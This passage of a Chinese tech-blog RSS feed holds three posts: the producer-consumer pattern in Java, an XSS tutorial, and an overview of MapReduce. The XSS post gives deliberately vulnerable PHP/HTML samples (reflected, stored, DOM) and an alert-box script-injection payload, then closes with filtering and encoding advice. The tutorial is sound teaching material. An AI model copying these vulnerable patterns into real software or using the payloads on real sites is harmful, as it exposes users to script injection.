<description>&lt;ul readability=&quot;8.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;生产者消费者模式是程序设计中非常常见的一种设计模式，被广泛运用在解耦、消息队列等场景。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2014953/202007/2014953-20200712004724417-180974568.png&quot; width=&quot;500&quot; alt=&quot; &quot; align=&quot;center&quot;/&gt;&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;使用生产者消费者模式通常需要在两者之间增加一个阻塞队列作为媒介，有了媒介之后就相当于有了一个缓冲，平衡了两者的能力。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;整体如上图所示，最上面是阻塞队列，右侧的 1 是生产者线程，生产者在生产数据后将数据存放在阻塞队列中，左侧的 2 是消费者线程，消费者获取阻塞队列中的数据。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;而中间的 3 和 4 分别代表生产者消费者之间互相通信的过程，因为无论阻塞队列是满还是空都可能会产生阻塞，阻塞之后就需要在合适的时机去唤醒被阻塞的线程。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;那么什么时候阻塞线程需要被唤醒呢？有两种情况。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;第一种情况是当消费者看到阻塞队列为空时，开始进入等待，这时生产者一旦往队列中放入数据，就会通知所有的消费者，唤醒阻塞的消费者线程。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;另一种情况是如果生产者发现队列已经满了，也会被阻塞，而一旦消费者获取数据之后就相当于队列空了一个位置，这时消费者就会通知所有正在阻塞的生产者进行生产。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;import java.util.concurrent.ArrayBlockingQueue;

/**
 * 使用阻塞队列实现一个生产者与消费者模型
 *
 * @author xiandongxie
 */
public class ProducerAndConsumer {

    private static ArrayBlockingQueue&amp;lt;String&amp;gt; queue = new ArrayBlockingQueue&amp;lt;&amp;gt;(10);

    public static void main(String[] args) throws InterruptedException {
        Producer producer = new Producer();
        Consumer consumer = new Consumer();
        Thread producer1 = new Thread(producer, &quot;producer-1&quot;);
        Thread producer2 = new Thread(producer, &quot;producer-2&quot;);
        Thread consumer1 = new Thread(consumer, &quot;consumer-2&quot;);
        Thread consumer2 = new Thread(consumer, &quot;consumer-2&quot;);

        producer1.start();
        producer2.start();
        consumer1.start();
        consumer2.start();

        Thread.sleep(5);
        producer1.interrupt();
        Thread.sleep(5);
        producer2.interrupt();

        Thread.sleep(5);
        consumer1.interrupt();
        consumer2.interrupt();

    }

    static class Producer implements Runnable {
        @Override
        public void run() {
            int count = 0;
            while (true &amp;amp;&amp;amp; !Thread.currentThread().isInterrupted()) {
                count++;
                String message = Thread.currentThread().getName() + &quot; message=&quot; + count;
                try {
                    queue.put(message);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    e.printStackTrace();
                }
            }
        }
    }

    static class Consumer implements Runnable {

        @Override
        public void run() {
            while (true &amp;amp;&amp;amp; !Thread.currentThread().isInterrupted()) {
                try {
                    String take = queue.take();
                    System.out.println(Thread.currentThread().getName() + &quot;,消费信息：&quot; + take);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    e.printStackTrace();
                }
            }
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;

&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;import java.util.LinkedList;
import java.util.Queue;
import java.util.concurrent.locks.Condition;
import java.util.concurrent.locks.ReentrantLock;

/**
 * 采用 Condition 自定义阻塞队列实现消费者与生产者
 *
 * @author xiandongxie
 */
public class MyBlockingQueueForCondition&amp;lt;E&amp;gt; {

    private Queue&amp;lt;E&amp;gt; queue;
    private int max = 16;
    private ReentrantLock lock = new ReentrantLock();
    // 没有空，则消费者可以消费，标记 消费者
    private Condition notEmpty = lock.newCondition();
    // 没有满，则生产者可以生产，标记 生产者
    private Condition notFull = lock.newCondition();

    public MyBlockingQueueForCondition(int size) {
        this.max = size;
        queue = new LinkedList();
    }

    public void put(E o) throws InterruptedException {
        lock.lock();
        try {
            while (queue.size() == max) {
                // 如果满了，阻塞生产者线程，释放 Lock
                notFull.await();
            }
            queue.add(o);
            // 有数据了，通知等待的消费者，并唤醒
            notEmpty.signalAll();
        } finally {
            lock.unlock();
        }
    }

    public E take() throws InterruptedException {
        lock.lock();
        try {
            while (queue.size() == 0) {
                // 如果为空，阻塞消费者线程
                notEmpty.await();
            }
            E item = queue.remove();
            // queue 未满，唤醒生产者
            notFull.signalAll();
            return item;
        } finally {
            lock.unlock();
        }
    }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;这里需要注意，在 take() 方法中使用 while( queue.size() == 0 ) 检查队列状态，而不能用 if( queue.size() == 0 )。&lt;/li&gt;
&lt;li&gt;因为生产者消费者往往是多线程的，假设有两个消费者，第一个消费者线程获取数据时，发现队列为空，便进入等待状态；&lt;/li&gt;
&lt;li&gt;因为第一个线程在等待时会释放 Lock 锁，所以第二个消费者可以进入并执行 if( queue.size() == 0 )，也发现队列为空，于是第二个线程也进入等待；&lt;/li&gt;
&lt;li&gt;而此时，如果生产者生产了一个数据，便会唤醒两个消费者线程，而两个线程中只有一个线程可以拿到锁，并执行 queue.remove 操作，另外一个线程因为没有拿到锁而卡在被唤醒的地方，而第一个线程执行完操作后会在 finally 中通过 unlock 解锁，而此时第二个线程便可以拿到被第一个线程释放的锁，继续执行操作，也会去调用 queue.remove 操作，然而这个时候队列已经为空了，所以会抛出 NoSuchElementException 异常，这不符合逻辑。&lt;/li&gt;
&lt;li&gt;而如果用 while 做检查，当第一个消费者被唤醒得到锁并移除数据之后，第二个线程在执行 remove 前仍会进行 while 检查，发现此时依然满足 queue.size() == 0 的条件，就会继续执行 await 方法，避免了获取的数据为 null 或抛出异常的情况。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;多线程的代码大部分都用 while 而不用 if&lt;/strong&gt;，不管线程在哪被切换停止了，while 的话，线程上次切换判断结果对下次切换判断没有影响，但是if的话，若线程切换前，条件成立过了，但是该线程再次拿到 cpu 使用权的时候，其实条件已经不成立了，所以不应该执行。（本质原因：就是原子性问题，CPU 严重的原子性是针对 CPU 指令的，而不是针对高级编程语言的语句的）。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;import java.util.LinkedList;

/**
 * 采用 wait，notify 实现阻塞队列
 *
 * @author xiandongxie
 */
public class MyBlockingQueue&amp;lt;E&amp;gt; {
    private int maxSize;
    private LinkedList&amp;lt;E&amp;gt; storage;

    public MyBlockingQueue(int maxSize) {
        this.maxSize = maxSize;
        storage = new LinkedList&amp;lt;&amp;gt;();
    }

    public synchronized void put(E e) throws InterruptedException {
        try {
            while (storage.size() == maxSize) {
                // 满了
                wait();
            }
            storage.add(e);
        } finally {
            notifyAll();
        }

    }

    public synchronized E take() throws InterruptedException {
        try {
            while (storage.size() == 0) {
                // 没有数据
                wait();
            }
            return storage.remove();
        } finally {
            notifyAll();
        }
    }

}
&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Sat, 11 Jul 2020 16:58:00 +0000</pubDate>
<dc:creator>abc十号</dc:creator>
<og:description>生产者消费者模式 生产者消费者模式是程序设计中非常常见的一种设计模式，被广泛运用在解耦、消息队列等场景。 使用生产者消费者模式通常需要在两者之间增加一个阻塞队列作为媒介，有了媒介之后就相当于有了一个缓</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/xiexiandong/p/13286399.html</dc:identifier>
</item>
<item>
<title>XSS原理及代码分析 - 雪痕*</title>
<link>http://www.cnblogs.com/lxfweb/p/13286271.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lxfweb/p/13286271.html</guid>
<description>&lt;p&gt;XSS又叫跨站脚本攻击，是一种对网站应用程序的安全漏洞攻击技术。它允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。XSS分为三种：反射型，存储型，和DOM型。下面我会构造有缺陷的代码，从代码分析这三种类型。&lt;br/&gt;如果想要了解XSS基础的可以看我的这篇文章：&lt;a href=&quot;https://www.cnblogs.com/lxfweb/p/12709061.html&quot;&gt;XSS(跨站脚本攻击)简单讲解&lt;/a&gt;&lt;br/&gt;如果想要了解SQL注入原理的可以看我的这两篇文章：&lt;a href=&quot;https://www.cnblogs.com/lxfweb/p/13236372.html&quot;&gt;SQL注入原理及代码分析(一)&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.cnblogs.com/lxfweb/p/13275582.html&quot;&gt;SQL注入原理及代码分析(二)&lt;/a&gt;&lt;br/&gt;参考文献：《Web安全攻防》&lt;/p&gt;

&lt;p&gt;反射型XSS又叫非持久型XSS，这种攻击方式往往具有一次性。&lt;br/&gt;先看代码&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;/&amp;gt;
    &amp;lt;title&amp;gt;xss利用输出的环境构造代码&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;center&amp;gt;
    &amp;lt;h6&amp;gt;把输入的字符串输出&amp;lt;/h6&amp;gt;
    &amp;lt;form action=&quot;#&quot; method=&quot;get&quot;&amp;gt;
        &amp;lt;h6&amp;gt;请输入&amp;lt;/h6&amp;gt;
        &amp;lt;input type=&quot;text&quot; name=&quot;xss&quot; value=&quot;请输入&quot;&amp;gt;&amp;lt;br /&amp;gt;
        &amp;lt;input type=&quot;submit&quot; value=&quot;确定&quot;&amp;gt;
    &amp;lt;/form&amp;gt;
    &amp;lt;hr&amp;gt;
    &amp;lt;?php
        if (isset($_GET['xss'])) {
              echo '&amp;lt;input type=&quot;text&quot; value=&quot;'.$_GET['xss'].'&quot;&amp;gt;';
        }else{
            echo '&amp;lt;input type=&quot;text&quot; value=&quot;输出&quot;&amp;gt;';
        }
    ?&amp;gt;
&amp;lt;/center&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在代码中，通过GET获取参数xss的值，然后通过echo输出一个input标签，并将xss的值放入input标签的value中。&lt;br/&gt;接下来我们看一下页面，例如我们输入123，会在下面的输出框中输出123。&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996712/202007/1996712-20200711191153813-324946649.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;那么下面，我们当我们输入&lt;code&gt;&quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;时，输出到页面的HTML代码变为&lt;code&gt;&amp;lt;input type=&quot;text&quot; value=&quot;&quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&amp;gt;&lt;/code&gt;我们发现，输入的双引号闭合了value属性的双引号，输入的&amp;gt;闭合了input的标签&amp;lt;,导致我们后面输入的恶意代码成为另一个HTML标签。&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996712/202007/1996712-20200711193134151-73452536.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;当浏览器渲染时执行了，JS函数alert()导致浏览器弹窗。&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996712/202007/1996712-20200711193346440-2021874941.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;先看代码，参考dvwa的核心代码。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = stripslashes( $message );
    $message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;amp;&amp;amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));

    // Sanitize name input
    $name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;amp;&amp;amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));

    // Update database
    $query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );&quot;;
    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( '&amp;lt;pre&amp;gt;' . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&amp;lt;/pre&amp;gt;' );
}
?&amp;gt; 
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在上面代码中，获取POST参数mtxMessage和txtName，然后将将参数插入到数据库的表中，并显示到页面上。&lt;br/&gt;页面的功能是获取用户名字和内容并插入到数据库中，如果我们输入恶意代码，那么也会插入到数据库中，只有用户访问这个页面，那么恶意代码就会执行。&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996712/202007/1996712-20200711221447280-517656528.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;打开数据库发现插入了我们构造的恶意代码。&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996712/202007/1996712-20200711221548824-2078937212.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;先看代码&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot; /&amp;gt;;
    &amp;lt;title&amp;gt;测试&amp;lt;/title&amp;gt;
    &amp;lt;script type=&quot;text/javascript&quot;&amp;gt;
            function tihuan() {
                    document.getElementById(&quot;id1&quot;).innerHTML =document.getElementById(&quot;dom_input&quot;).value;
            }
    &amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;center&amp;gt;
    &amp;lt;h6 id=&quot;id1&quot;&amp;gt;这里显示输入的内容&amp;lt;/h6&amp;gt;
    &amp;lt;form action=&quot;#&quot; method=&quot;post&quot;&amp;gt;
           &amp;lt;input type=&quot;text&quot; id=&quot;dom_input&quot; value=&quot;输入&quot;&amp;gt;&amp;lt;br /&amp;gt;
           &amp;lt;input type=&quot;button&quot; value=&quot;替换&quot; onclick=&quot;tihuan()&quot;&amp;gt;
    &amp;lt;/form&amp;gt;
    &amp;lt;hr&amp;gt;

&amp;lt;/center&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;DOM型XSS程序只有HTML代码，并不存在服务端代码，所以此程序并没有与服务端进行交互。程序存在JS函数tihuan(),该函数得作用是通过DOM操作将元素id1得内容修改为元素dom_input的内容。&lt;br/&gt;这个页面得功能是输入框中输入什么，上面得文字就会被替换成什么。&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996712/202007/1996712-20200711235447395-1150451522.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;如果我们输入恶意代码，比如&lt;img src=&quot;https://www.cnblogs.com/lxfweb/p/1&quot;/&gt;，单击替换按钮，页面弹出消息框，由于隐式输出，所以查看源代码时是看不到XSS代码的。&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1996712/202007/1996712-20200712000530166-882263112.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;ol&gt;&lt;li&gt;过滤输入的数据包括但不限于单引号，双引号，“&amp;lt;,&amp;gt;”等。&lt;/li&gt;
&lt;li&gt;对输出到页面的数据进行相应的编码转换，包括HTML实体编码，JavaScript编码等。&lt;/li&gt;
&lt;/ol&gt;</description>
<pubDate>Sat, 11 Jul 2020 16:14:00 +0000</pubDate>
<dc:creator>雪痕*</dc:creator>
<og:description>#前言 XSS又叫跨站脚本攻击，是一种对网站应用程序的安全漏洞攻击技术。它允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。XSS分为三种：反射型，存储型，和DOM型。下面我会构造有缺陷的</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/lxfweb/p/13286271.html</dc:identifier>
</item>
<item>
<title>MapReduce的运行流程概述 - 孙晨c</title>
<link>http://www.cnblogs.com/sunbr/p/13286217.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/sunbr/p/13286217.html</guid>
<description>&lt;h2 id=&quot;mapreduce处理数据的大致流程&quot;&gt;MapReduce处理数据的大致流程&lt;/h2&gt;
&lt;p&gt;①&lt;code&gt;InputFormat&lt;/code&gt;调用&lt;code&gt;RecordReader&lt;/code&gt;，从输入目录的文件中，读取一组数据，封装为&lt;code&gt;keyin-valuein&lt;/code&gt;对象&lt;/p&gt;
&lt;p&gt;②将封装好的key-value，交给&lt;code&gt;Mapper.map()&lt;/code&gt;------&amp;gt;将处理的结果写出 &lt;code&gt;keyout-valueout&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;③&lt;code&gt;ReduceTask&lt;/code&gt;启动&lt;code&gt;Reducer&lt;/code&gt;，使用&lt;code&gt;Reducer.reduce()&lt;/code&gt;处理Mapper的keyout-valueout&lt;/p&gt;
&lt;p&gt;④OutPutFormat调用&lt;code&gt;RecordWriter&lt;/code&gt;，将Reducer处理后的keyout-valueout写出到文件&lt;/p&gt;
&lt;blockquote readability=&quot;2.8125&quot;&gt;
&lt;p&gt;关于这些名词的解释参考我之前的文章&lt;a href=&quot;https://www.cnblogs.com/sunbr/p/13286002.html&quot;&gt;MapReduce计算框架的核心编程思想&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;示例&quot;&gt;示例&lt;/h2&gt;
&lt;p&gt;需求： &lt;strong&gt;统计/hello目录中每个文件的&lt;mark&gt;单词数量&lt;/mark&gt;，&lt;br/&gt;&lt;mark&gt;a-p开头&lt;/mark&gt;的单词放入到一个结果文件中，&lt;br/&gt;&lt;mark&gt;q-z开头&lt;/mark&gt;的单词放入到另外一个结果文件中。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;例如：&lt;br/&gt;&lt;strong&gt;/hello/a.txt&lt;/strong&gt;，文件大小200M&lt;br/&gt;hello,hi,hadoop&lt;br/&gt;hive,hadoop,hive,&lt;br/&gt;zoo,spark,wow&lt;br/&gt;zoo,spark,wow&lt;br/&gt;...&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;/hello/b.txt&lt;/strong&gt;，文件大小100M&lt;br/&gt;hello,hi,hadoop&lt;br/&gt;zoo,spark,wow&lt;br/&gt;...&lt;/p&gt;
&lt;h2 id=&quot;1-map阶段运行maptask，将一个大的任务切分为若干小任务，处理输出阶段性的结果&quot;&gt;&lt;strong&gt;1. Map阶段(运行MapTask，将一个大的任务切分为&lt;mark&gt;若干小任务&lt;/mark&gt;，处理输出阶段性的结果)&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;①切片(切分数据)&lt;br/&gt;/hello/a.txt 200M&lt;br/&gt;/hello/b.txt 100M&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;默认的切分策略是以文件为单位，以文件的&lt;mark&gt;块大小(128M)&lt;/mark&gt;为&lt;mark&gt;片大小&lt;/mark&gt;进行切片！&lt;/strong&gt;&lt;br/&gt;split0:/hello/a.txt,0-128M&lt;br/&gt;split1: /hello/a.txt,128M-200M&lt;br/&gt;split2: /hello/b.txt,0M-100M&lt;/p&gt;
&lt;h3 id=&quot;②运行maptask（进程），每个maptask负责一片数据&quot;&gt;&lt;strong&gt;②运行MapTask（进程），每个MapTask负责一片数据&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;split0:/hello/a.txt,0-128M--------&lt;code&gt;MapTask1&lt;/code&gt;&lt;br/&gt;split1: /hello/a.txt,128M-200M--------&lt;code&gt;MapTask2&lt;/code&gt;&lt;br/&gt;split2: /hello/b.txt,0M-100M--------&lt;code&gt;MapTask3&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;③读取数据阶段&quot;&gt;&lt;strong&gt;③读取数据阶段&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;在MR中，所有的数据必须封装为&lt;code&gt;key-value&lt;/code&gt;&lt;br/&gt;MapTask1,2,3都会初始化一个InputFormat（默认TextInputFormat），每个InputFormat对象负责创建一个RecordReader(LineRecordReader)对象，&lt;br/&gt;RecordReader负责从每个切片的数据中读取数据，封装为key-value&lt;/p&gt;
&lt;p&gt;&lt;code&gt;LineRecordReader&lt;/code&gt;: 将文件中的&lt;mark&gt;每一行&lt;/mark&gt;封装为一个key（offset）-value(当前行的内容)&lt;br/&gt;举例：&lt;br/&gt;hello,hi,hadoop-----&amp;gt;(0,hello,hi,hadoop)&lt;br/&gt;hive,hadoop,hive-----&amp;gt;(20,hive,hadoop,hive)&lt;br/&gt;zoo,spark,wow-----&amp;gt;(30,zoo,spark,wow)&lt;br/&gt;zoo,spark,wow-----&amp;gt;(40,zoo,spark,wow)&lt;/p&gt;
&lt;h3 id=&quot;④进入mapper的map阶段&quot;&gt;④进入Mapper的map()阶段&lt;/h3&gt;
&lt;p&gt;map()是Map阶段的核心处理逻辑！ 单词统计! map()会循环调用，对输入的每个Key-value都进行处理！&lt;br/&gt;输入：(0,hello,hi,hadoop)&lt;br/&gt;输出：(hello,1),(hi,1),(hadoop,1)&lt;/p&gt;
&lt;p&gt;输入：(20,hive,hadoop,hive)&lt;br/&gt;输出：(hive,1),(hadoop,1),(hive,1)&lt;/p&gt;
&lt;p&gt;输入：(30,zoo,spark,wow)&lt;br/&gt;输出：(zoo,1),(spark,1),(wow,1)&lt;/p&gt;
&lt;p&gt;输入：(40,zoo,spark,wow)&lt;br/&gt;输出：(zoo,1),(spark,1),(wow,1)&lt;/p&gt;
&lt;h3 id=&quot;⑤将maptask输出的记录进行分区分组、分类&quot;&gt;⑤将MapTask输出的记录进行分区(分组、分类)&lt;/h3&gt;
&lt;p&gt;在Mapper输出后，调用&lt;code&gt;Partitioner&lt;/code&gt;，对Mapper输出的key-value进行分区，分区后也会排序（默认字典顺序排序）&lt;br/&gt;&lt;strong&gt;分区规则：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;a-p开头的单词放入到一个区&lt;/li&gt;
&lt;li&gt;q-z开头的单词放入到另一个区&lt;br/&gt;MapTask1:&lt;br/&gt;0号区： (hadoop,1)，(hadoop,1)，(hello,1),(hi,1),(hive,1),(hive,1)&lt;br/&gt;1号区： (spark,1),(spark,1),(wow,1) ，(wow,1),(zoo,1)(zoo,1)&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;MapTask2:&lt;br/&gt;0号区： ...&lt;br/&gt;1号区： ...&lt;/p&gt;
&lt;p&gt;MapTask3:&lt;br/&gt;0号区： (hadoop,1),(hello,1),(hi,1),&lt;br/&gt;1号区： (spark,1),(wow,1),(zoo,1)&lt;/p&gt;
&lt;h2 id=&quot;2reduce阶段&quot;&gt;2.Reduce阶段&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;①因为需求是生成&lt;mark&gt;两个结果文件&lt;/mark&gt;，所以我们需要启动&lt;mark&gt;两个ReduceTask&lt;/mark&gt;&lt;/strong&gt;&lt;br/&gt;ReduceTask启动后，会启动&lt;code&gt;shuffle&lt;/code&gt;线程，从MapTask中&lt;mark&gt;拷贝&lt;/mark&gt;相应分区的数据！&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ReduceTask1&lt;/code&gt;: 只负责0号区&lt;br/&gt;将三个MapTask，生成的0号区数据全部拷贝到ReduceTask所在的机器！&lt;br/&gt;(hadoop,1)，(hadoop,1)，(hello,1),(hi,1),(hive,1),(hive,1)&lt;br/&gt;(hadoop,1),(hello,1),(hi,1),&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ReduceTask2&lt;/code&gt;: 只负责1号区&lt;br/&gt;将三个MapTask，生成的1号区数据全部拷贝到ReduceTask所在的机器！&lt;br/&gt;(spark,1),(spark,1),(wow,1) ，(wow,1),(zoo,1)(zoo,1)&lt;br/&gt;(spark,1),(wow,1),(zoo,1)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;②sort&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ReduceTask1&lt;/code&gt;: 只负责0号区进行排序：&lt;br/&gt;(hadoop,1)，(hadoop,1)，(hadoop,1),(hello,1),(hello,1),(hi,1),(hi,1),(hive,1),(hive,1)&lt;br/&gt;&lt;code&gt;ReduceTask2&lt;/code&gt;: 只负责1号区进行排序：&lt;br/&gt;(spark,1),(spark,1),(spark,1),(wow,1) ，(wow,1),(wow,1),(zoo,1),(zoo,1)(zoo,1)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;③reduce&lt;/strong&gt;&lt;br/&gt;&lt;mark&gt;ReduceTask1----&amp;gt;Reducer-----&amp;gt;reduce(一次读入一组数据)&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;何为一组数据： key相同的为一组数据&lt;br/&gt;输入： (hadoop,1)，(hadoop,1)，(hadoop,1)&lt;br/&gt;输出： (hadoop,3)&lt;/p&gt;
&lt;p&gt;输入： (hello,1),(hello,1)&lt;br/&gt;输出： (hello,2)&lt;/p&gt;
&lt;p&gt;输入： (hi,1),(hi,1)&lt;br/&gt;输出： (hi,2)&lt;/p&gt;
&lt;p&gt;输入：(hive,1),(hive,1)&lt;br/&gt;输出： （hive,2）&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;ReduceTask2----&amp;gt;Reducer-----&amp;gt;reduce(一次读入一组数据)&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;输入： (spark,1),(spark,1),(spark,1)&lt;br/&gt;输出： (spark,3)&lt;/p&gt;
&lt;p&gt;输入： (wow,1) ，(wow,1),(wow,1)&lt;br/&gt;输出： (wow,3)&lt;/p&gt;
&lt;p&gt;输入：(zoo,1),(zoo,1)(zoo,1)&lt;br/&gt;输出： (zoo,3)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;④调用OutPutFormat中的RecordWriter将Reducer输出的记录写出&lt;/strong&gt;&lt;br/&gt;&lt;mark&gt;ReduceTask1----&amp;gt;OutPutFormat（默认TextOutPutFormat）----&amp;gt;RecordWriter（LineRecoreWriter）&lt;/mark&gt;&lt;br/&gt;&lt;code&gt;LineRecoreWriter&lt;/code&gt;将一个&lt;code&gt;key-value&lt;/code&gt;以一行写出，key和alue之间使用&lt;code&gt;\t&lt;/code&gt;分割&lt;br/&gt;在输出目录中，生成文件&lt;code&gt;part-r-0000&lt;/code&gt;&lt;br/&gt;hadoop 3&lt;br/&gt;hello 2&lt;br/&gt;hi 2&lt;br/&gt;hive 2&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;ReduceTask2----&amp;gt;OutPutFormat（默认TextOutPutFormat）------&amp;gt;RecordWriter（LineRecoreWriter）&lt;/mark&gt;&lt;br/&gt;&lt;code&gt;LineRecoreWriter将&lt;/code&gt;一个&lt;code&gt;key-value&lt;/code&gt;以一行写出，key和alue之间使用&lt;code&gt;\t&lt;/code&gt;分割&lt;br/&gt;在输出目录中，生成文件&lt;code&gt;part-r-0001&lt;/code&gt;&lt;br/&gt;spark 3&lt;br/&gt;wow 3&lt;br/&gt;zoo 3&lt;/p&gt;
&lt;h2 id=&quot;三、mr总结&quot;&gt;三、MR总结&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;Map&lt;/code&gt;阶段(MapTask)： 切片(Split)-----读取数据(Read)-------交给Mapper处理(Map)------分区和排序(sort)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Reduce&lt;/code&gt;阶段(ReduceTask): 拷贝数据(copy)------排序(sort)-----合并(reduce)-----写出(write)&lt;/p&gt;
</description>
<pubDate>Sat, 11 Jul 2020 15:59:00 +0000</pubDate>
<dc:creator>孙晨c</dc:creator>
<og:description>MapReduce处理数据的大致流程 ①InputFormat调用RecordReader，从输入目录的文件中，读取一组数据，封装为keyin-valuein对象 ②将封装好的key-value，交给</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/sunbr/p/13286217.html</dc:identifier>
</item>
</channel>
</rss>